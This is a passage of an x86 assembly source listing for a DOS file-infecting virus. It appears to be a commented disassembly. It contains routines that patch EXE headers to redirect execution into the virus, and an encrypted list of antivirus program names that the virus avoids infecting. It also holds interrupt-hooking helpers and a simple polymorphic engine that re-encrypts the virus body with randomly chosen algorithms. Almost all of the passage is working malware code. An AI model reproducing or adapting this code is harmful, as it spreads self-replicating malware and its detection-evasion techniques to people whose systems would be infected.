                JC      Bad_Infect

                MOV     AH, 40h                 ; Write updated header back.
                MOV     CX, 24
                MOV     DX, OFFSET File_Header
                CALL    Do_Real_Int21h

                CLC

		RETN

Bad_Infect:     STC

		RETN


Infect_EXE_Header:

		PUSH	BX

                LES     AX, [SI+12h]            ; Save host's CS:IP.
                MOV     Host_IP, AX
                MOV     Host_CS, ES

                LES     AX, [SI+0Ch]            ; Save host's SS:SP.
                MOV     Host_SS, AX
                MOV     Host_SP, ES

		PUSH	CS
		POP	ES

                XCHG    CX, AX                  ; DX:AX = hostsize.

                MOV     BX, AX                  ; Save hostsize in DI:BX.
                MOV     DI, DX

                MOV     CX, 512                 ; Calculate count of 512-byte
                DIV     CX                      ; pages.

                INC     AX                      ; Round upwards.

                CMP     [SI+02h], AX            ; Same as header says?
                JNE     Bad_Header_Inf          ; Else the file has overlays.

                CMP     [SI], DX                ; Also verify image size
                JNE     Bad_Header_Inf          ; modulo 512.

                ADD     AX, 2448/512
                ADD     DX, 2448 MOD 512

                CMP     DX, 512                 ; DX exceeds 512 ?
                CMC                             ; Flip CF.
                ADC     AX, 0                   ; Add 1 to AX if DX >= 512.

                AND     DH, 511 SHR 8           ; DX modulo 512.

                MOV     [SI+02h], AX            ; Set new image size.
                MOV     [SI], DX

                MOV     DX, DI                  ; Save hostsize in DX:AX.
                XCHG    BX, AX

                MOV     BX, [SI+06h]            ; DI:BX = headersize in
                XOR     DI, DI                  ; paragraphs.

                MOV     CX, 4                   ; MUL 16.

Multiply_DI_BX: SHL     BX, 1                   ; Calculate headersize in
                RCR     DI, 1                   ; bytes.
                LOOP    Multiply_DI_BX

                SUB     AX, BX                  ; Calculate imagesize.
                SBB     DX, DI

                MOV     BX, 0-(2448+1000)

Check_IP_Range: CMP     AX, BX                  ; IP isn't too large? (else
                JB      Check_Size              ; (virus crosses segments).

                SUB     AX, 16                  ; 16 bytes down.
                INC     DX                      ; 1 segment up.
                JMP     SHORT Check_IP_Range

Check_Size:     CMP     DX, 15                  ; Too big?
                JA      Bad_Header_Inf

                MOV     CL, 4                   ; DIV 1024.
                ROR     DX, CL

                MOV     [SI+12h], AX            ; Set new CS:IP for host.
                MOV     [SI+14h], DX

                PUSH    AX                      ; Save IP for engine.

                SUB     AX, BX                  ; Calculate new SP.

                AND     AL, 11111110b           ; SP must always be even.

                MOV     [SI+0Eh], AX            ; Set new SP.

                ADD     DX, (256/16)            ; Set new SS.
                MOV     [SI+0Ch], DX

                SHR     AX, CL                  ; Update MinMemSize to also
                ADD     [SI+08h], AX            ; hold the stack.

		POP	AX

                CMP     WORD PTR [SI+0Ah], -1   ; MaxMemSize must allocate
                JNE     Bad_Header_Inf          ; all available memory.

                POP     BX                      ; Restore file handle.

                CLC

		RETN

Bad_Header_Inf: POP     BX

                STC

		RETN



Check_File_Name:

		PUSH	DS
		POP	ES

                MOV     DI, DX
                MOV     CX, 80

                XOR     AX, AX                  ; Find end of ASCIIZ.
                CLD
                REPNE   SCASB
                JNZ     Bad_File

                STD
                MOV     SI, DI
                XOR     DI, DI
                MOV     CX, 5

                LODSB                           ; Zero terminator of path.

		PUSH	SI

Checksum_Ext:   LODSB                           ; Fetch byte from extension.
                AND     AL, 0DFh                ; Convert to uppercase.

                XOR     DI, AX                  ; Update checksum with byte.
                SHL     DI, CL
                LOOP    Checksum_Ext

                SUB     DI, 25C4h               ; Result is 0 if extension
                                                ; was '.COM'.
		POP	SI

		PUSH	DI
                CALL    Check_For_AV_File
		POP	DI
                JC      Bad_File

                CLC

		RETN

Bad_File:       STC

		RETN



Check_For_AV_File:

		PUSH	CS
		POP	ES

                MOV     CX, 7                   ; Check for 7 AV filenames.
                MOV     DI, OFFSET AV_File_List

Compare_Name:   PUSH    CX
		PUSH	DI
		PUSH	SI

                MOV     BX, 10

Compare_Pos:    MOV     CX, 4
		PUSH	DI

Compare_Byte:   STD
                LODSB

                AND     AL, 0DFh                ; Convert to uppercase.
                XOR     AL, 0ADh                ; Encrypt character.

                CLD                             ; It matches?
                SCASB
                LOOPE   Compare_Byte            ; Loop while it does.

		POP	DI
                JE      Is_AV_File

                CMP     SI, DX                  ; Reached start of path?
                JE      Go_Next_Name

		DEC	BX
                JNZ     Compare_Pos

Go_Next_Name:   POP     SI
		POP	DI
		POP	CX

                ADD     DI, 4                   ; Next AV filename.

                LOOP    Compare_Name

                CLC

		RETN

Is_AV_File:     POP     SI
		POP	DI
		POP	CX

                STC

		RETN


Virus_Int24h:
                MOV     AL, 03h
                IRET


Push_All:
                POP     CS:Return_Address

                PUSHF
		PUSH	AX
		PUSH	BX
		PUSH	CX
		PUSH	DX
		PUSH	DI
		PUSH	SI
		PUSH	DS
		PUSH	ES

                JMP     CS:Return_Address


Pop_All:
                POP     CS:Return_Address

		POP	ES
		POP	DS
		POP	SI
		POP	DI
		POP	DX
		POP	CX
		POP	BX
		POP	AX
                POPF

                JMP     CS:Return_Address


Do_Disk_Int:
                CMP     DL, 80h                 ; Call is destined for HDD ?
                JAE     Go_Call_Int13h          ; Then use INT 13h.

                CALL    Do_Real_Int40h          ; Else use INT 40h.

		RETN


Go_Call_Int13h: CALL    Do_Real_Int13h          ; *** These two instructions
                RETN                            ; aren't needed.


Do_Real_Int13h:
                PUSHF
                CALL    DWORD PTR CS:Real_Int13h

		RETN


Do_Old_Int13h:
                PUSHF
                CALL    DWORD PTR CS:Old_Int13h

		RETN


Do_Real_Int21h:
                PUSHF
                CALL    DWORD PTR CS:Real_Int21h

		RETN


Do_Old_Int21h:
                PUSHF
                CALL    DWORD PTR CS:Old_Int21h

		RETN


Do_Real_Int40h:
                PUSHF
                CALL    DWORD PTR CS:Real_Int40h

		RETN


Do_Old_Int40h:
                PUSHF                           ; *** Routine is never used.
                CALL    DWORD PTR CS:Old_Int40h

		RETN

                ; Reversed and encrypted with XOR 0ADh:

AV_File_List:   DB      0F9h, 0E2h, 0FFh, 0FDh  ; PROT (F-prot).
                DB      0E3h, 0ECh, 0EEh, 0FEh  ; SCAN (McAfee Scan).
                DB      0ECh, 0E8h, 0E1h, 0EEh  ; CLEA (McAfee Clean).
                DB      0EBh, 0ECh, 0FEh, 0FBh  ; VSAF (VSafe).
                DB      0FBh, 0ECh, 0FDh, 0EEh  ; PCAV (PC-Tools AV).
                DB      0A3h, 0FBh, 0ECh, 0E3h  ; NAV. (Norton AV).
                DB      0E2h, 0EEh, 0E8h, 0E9h  ; DECO (?).

Host_Word       DW      20CDh
Host_IP         DW      0
Host_CS         DW      0
Host_SP         DW      0
Host_SS         DW      0
Random_Seed     DW      0

        ; A humble 'polymorphic' engine, all it does actually is use
        ; a random decryption algorithm in the static decryptors. Can
        ; easily be detected using a wildcard scanstring.

Poly_Engine:
		PUSH	BX
		PUSH	BP

                XCHG    BP, AX                  ; BP = runtime delta offset.

                MOV     AX, -1                  ; Get random encryption key.
                CALL    Random_AX

                XCHG    BX, AX                  ; Save it in BX.

                MOV     SI, OFFSET Decryptor    ; Static decryptor skeleton.
                MOV     DI, OFFSET Buffer+512   ; Work buffer.

                CLD
                MOVSW                           ; PUSH CS / POP DS
                MOVSB                           ; MOV DI, xxxx

                LODSW                           ; Last word of viruscode.

                ADD     AX, BP                  ; Add runtime delta offset.
                STOSW

                MOVSB                           ; MOV AX, xxxx

                LODSW                           ; Skip next data word.

                MOV     AX, BX                  ; Store decryption key.
                STOSW

                MOVSW                           ; MOV CX, Words_To_Decrypt
                MOVSW                           ; DEC CX
                MOVSW                           ; JS Decrypted_Code

                MOV     AX, 8-1                 ; Pick random encryption
                CALL    Random_AX               ; algorithm.

                SHL     AX, 1                   ; MUL 4.
                SHL     AX, 1

		PUSH	SI

                MOV     SI, OFFSET Cryptors
                ADD     SI, AX

                MOV     AX, 2-1                 ; Get boolean value.
                CALL    Random_AX

                TEST    AL, 00000001b           ; Swap encryption and 
                                                ; decryption algorithm?
                CLD
                LODSW
                JZ      Store_Decrypt

                XCHG    [SI], AX                ; Swap encryption and
                MOV     [SI-2], AX              ; decryption algorithm so the
                                                ; next time the opposite one
                                                ; can be used.

Store_Decrypt:  STOSW                           ; Store decryptor.
                LODSW                           ; Fetch encryptor.

                MOV     Encryptor, AX           ; Store it.

                MOV     AX, 8-1                 ; Pick random key slider.
                CALL    Random_AX

                SHL     AX, 1                   ; MUL 4.
                SHL     AX, 1

                MOV     SI, OFFSET Sliders
                ADD     SI, AX

                MOV     AX, 2-1                 ; Get boolean.
                CALL    Random_AX

                TEST    AL, 00000001b           ; Use another encryption algo
                JZ      Swap_Boolean            ; instead of a key slider?

                SUB     SI, 8*4                 ; Index the cryptors.

Swap_Boolean:   MOV     AL, 2-1                 ; Get a boolean.
                CALL    Random_AX

                TEST    AL, 00000001b           ; Swap sliders?
                LODSW
                JZ      Store_Slider

                XCHG    [SI], AX                ; Swap sliders (or cryptors)
                MOV     [SI-2], AX              ; for more randomness.

Store_Slider:   STOSW                           ; Store key slider (or 2nd
                                                ; decryptor).

                LODSW                           ; Fetch mirror slider (or
                                                ; cryptor).
                MOV     Slider, AX

                POP     SI                      ; SI = skeleton decryptor.

                LODSW                           ; Skip the two NULL words.
                LODSW

                MOVSW                           ; DEC DI / DEC DI
                MOVSW                           ; JMP SHORT Decrypt_Loop

                XOR     SI, SI
                XOR     CX, CX
		DEC	DI
		DEC	DI

                JMP     $+2                     ; Flush prefetch que.

Encrypt_Poly:   LODSW                           ; Fetch word from virusbody.
                INC     DI                      ; Go to next one.
		INC	DI
                MOV     [DI], AX                ; Store unencrypted word.

                MOV     AX, BX                  ; AX = encryption key.
Slider          DW      0                       ; Update encryption key.
Encryptor       DW      0                       ; Encrypt word.

                MOV     BX, AX                  ; Save updated encryption key
                                                ; in BX again.

                INC     CX                      ; Go to next word.

                CMP     CX, (2448-22)/2         ; Did entire virus yet?
                JNE     Encrypt_Poly

                MOV     [Buffer+512+(Init_Decrypt-Decryptor)], AX

                POP     BP
                POP     BX

                RETN


Cryptors:       XOR     [DI], AX                ; Encryptor.
                XOR     [DI], AX                ; Corresponding decryptor.
                XOR     [DI], CX                ; Encryptor, etc.
                XOR     [DI], CX
                ADD     [DI], AX
                SUB     [DI], AX
                ADD     [DI], CX
                SUB     [DI], CX
                NOT     WORD PTR [DI]
                NOT     WORD PTR [DI]
                NEG     WORD PTR [DI]
                NEG     WORD PTR [DI]
                ROR     WORD PTR [DI], 1
                ROL     WORD PTR [DI], 1
                ROR     WORD PTR [DI], CL
                ROL     WORD PTR [DI], CL

Sliders:        ROR     AX, CL
                ROL     AX, CL
                ROR     AX, 1
                ROL     AX, 1
                NOT     AX
                NOT     AX
                NEG     AX
                NEG     AX
                ROR     AH, CL
                ROL     AH, CL
                ROR     AL, CL
                ROL     AL, CL
                ADD     AH, CL
                SUB     AH, CL
                ADD     AL, CL
                SUB     AL, CL

Decryptor:
                PUSH    CS
                POP     DS

                MOV     DI, 2448-2
                MOV     AX, 0
Init_Decrypt    =       WORD PTR $-2
                MOV     CX, (2448-22)/2

Decrypt_Loop:   DEC     CX
                JS      $+10

                DW      0
                DW      0

                DEC     DI
                DEC     DI
                JMP     Decrypt_Loop

                ; More junkbytes I can't seem to decipher.

                DB      0BCh, 09Bh, 09Ch, 097h, 09Dh, 09Fh, 08Ch
                DB      09Bh, 09Ch, 0E0h, 08Ch, 091h, 0E0h, 0BFh
                DB      0AEh, 0BDh, 0AAh, 0D2h, 0D2h, 0D2h, 0E0h

Random_AX:
                PUSH    CX
		PUSH	DX
		PUSH	DS

                XCHG    CX, AX                  ; Save max_value in CX.

                XOR     AX, AX                  ; Zero DS.
                MOV     DS, AX

                MOV     AX, DS:[46Ch]           ; BIOS tickcount.

		PUSH	CS
		POP	DS

                ADD     AX, Random_Seed         ; Randomize values.
                ROR     AX, 1
                ADD     Random_Seed, AX
                ROR     AX, 1
                XOR     AX, Random_Seed

                XOR     DX, DX

                INC     CX                      ; Asking for just a random #?
                JZ      Exit_Random_AX          ; Then use the random # AX.

                DIV     CX                      ; Divide random value by
                                                ; max_value.

                XCHG    DX, AX                  ; The remainder is the random
                                                ; in range number.
Exit_Random_AX: POP     DS
		POP	DX
		POP	CX

		RETN

                ; Virus' heap variables.

FAR_JMP         =       BYTE PTR $
FAR_JMP_IP      =       WORD PTR $+1
FAR_JMP_CS      =       WORD PTR $+3
Old_Int01h      =       WORD PTR $+5
Real_Int13h     =       WORD PTR $+9
Old_Int13h      =       WORD PTR $+13
Real_Int21h     =       WORD PTR $+17
Old_Int21h      =       WORD PTR $+21
Real_Int40h     =       WORD PTR $+25
Old_Int40h      =       WORD PTR $+29
Start_MCB       =       WORD PTR $+33
Return_Address  =       WORD PTR $+35
Tunnel_Mode     =       BYTE PTR $+37
Step_Count      =       BYTE PTR $+38
File_Header     =       WORD PTR $+39
Buffer          =       WORD PTR $+63

		END	START
